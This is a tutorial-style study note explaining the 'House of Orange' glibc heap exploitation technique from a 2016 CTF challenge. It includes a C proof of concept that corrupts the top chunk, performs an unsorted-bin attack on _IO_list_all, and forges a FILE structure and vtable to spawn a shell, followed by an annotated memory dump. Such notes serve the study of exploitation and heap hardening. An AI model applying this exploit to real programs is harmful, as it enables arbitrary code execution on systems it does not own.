# House of Orange
> LongChampion, 25/03/2020

Finally, I have understood this attack. To do that, I read both the source code in this repository and the [writeup of origin "House of Orange"](http://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html) (in fact, it is a real challenge in CTF contest).  
The attack can be divide into 3 stages:
1. Corrupt the top_chunk so that we have a controllable chunk in unsorted_bin.
2. Use `unsorted_bin_attach` to overwrite `_IO_list_all` of **GLIBC** with pointer to our chunk.
3. Forge a fake FILE_IO struct and a vtable to spawn a shell.

Look at the example below:
```c
#include <stdlib.h>

#define PREV_INUSE 0x01

struct Chunk
{
    long long pre_size, size;
    struct Chuck *fd, *bk;
};

int main()
{
    // Stage 1
    void *p1 = malloc(0x400 - 8);
    struct Chunk *TOP = (struct Chunk *) (p1 + 0x400 - 0x10);
    TOP->size = 0xc00 | PREV_INUSE;
    void *p2 = malloc(0x1000 - 8);

    // Stage 2
    TOP->size = 0x60 | PREV_INUSE;
    long long IO_LIST_ALL = (long long) TOP->fd + 0x9a8;
    TOP->bk = (struct Chunk *) (IO_LIST_ALL - 0x10);

    // Stage 3
    long long *Fake_FileIO = (long long *) TOP;
    long long *Fake_vtable = (long long *) &Fake_FileIO[28];
    Fake_FileIO[0] = 0x68732f6e69622f;    // hex of "/bin/sh\0"
    Fake_FileIO[4] = 2;                   // _IO_write_base
    Fake_FileIO[5] = 3;                   // _IO_write_ptr
    Fake_FileIO[12] = 0;                  // _mode
    Fake_FileIO[27] = Fake_vtable;        // Pointer to vtable
    Fake_vtable[3] = system;

    malloc(10);
}
```
## Stage 1
In stage 1, we allocate one chunk and overflow it to overwrite top_chunk's size. The new top_chunk's size must be smaller than the origin value as well as aligned correctly. Don't forget to set `PREV_INUSE` flag in new size. Then we allocate another chunk with request size larger than current size of top_chunk. This activity will make **GLIBC** invoke `sysmalloc` to free and push out top_chunk into unsorted_bin. **GLIBC** also creates a new top_chunk but we don't care about it at this time.

## Stage 2
Is this stage, we continue use overflow to control content of old top_chunk (which is now in unsorted_bin). Its size is changed to 0x60 to make it become small chunk (not fast chunk). Its `bk` pointer is set to offset 0x10 before `_IO_list_all` in **GLIBC**. According to `unsorted_bin_attack`, `_IO_list_all` will be overwrite and point to `main_arena+88`, when `main_arena_88` is point to... our old top_chunk.

## Stage 3
This stage is very easy if you have known about structure of FILE_IO and vtable. Let Google-fu or look at [this article](https://outflux.net/blog/archives/2011/12/22/abusing-the-file-structure/). I will show you the memory layout of our top_chunk to increase visibility.
```
Address     Value               Value
0x602400:	0x0068732f6e69622f	0x0000000000000061
0x602410:	0x00007ffff7dd1b78	0x00007ffff7dd2510
0x602420:	0x0000000000000002	0x0000000000000003
0x602430:	0x0000000000000000	0x0000000000000000
0x602440:	0x0000000000000000	0x0000000000000000
0x602450:	0x0000000000000000	0x0000000000000000
0x602460:	0x0000000000000000	0x0000000000000000
0x602470:	0x0000000000000000	0x0000000000000000
0x602480:	0x0000000000000000	0x0000000000000000
0x602490:	0x0000000000000000	0x0000000000000000
0x6024a0:	0x0000000000000000	0x0000000000000000
0x6024b0:	0x0000000000000000	0x0000000000000000
0x6024c0:	0x0000000000000000	0x0000000000000000
0x6024d0:	0x0000000000000000	0x00000000006024e0
0x6024e0:	0x0000000000000000	0x0000000000000000
0x6024f0:	0x0000000000000000	0x0000000000400440
```
Out top_chunk is start at 0x602400, it is also the begining of fake FILE_IO. A fake vtable is start at 0x6024e0, and imediately before it is a vtable pointer of fake FILE_IO. Try to collate this layout with the example code to find the meaning of each value.

The last step is call `malloc` function to trigger our trap, so **GLIBC** will fall into it and give us a shell.

## Note
- In practice, this attack require heap leak and **GLIBC** leak to perform.
- I think we can replace top_chunk with an arbitrary unsorted chunk, did you try it?
- "At stage 2, change top_chunk size to 0x60 make it become small chunk". Why not fast chunk? Remember that, when a fast chunk is freed, it will be push into fastbin, not unsorted_bin!
- As you can see, our top_chunk and our fake FILE_IO is overlapped, but they fit with each other perfectly thanks to *GOD*.
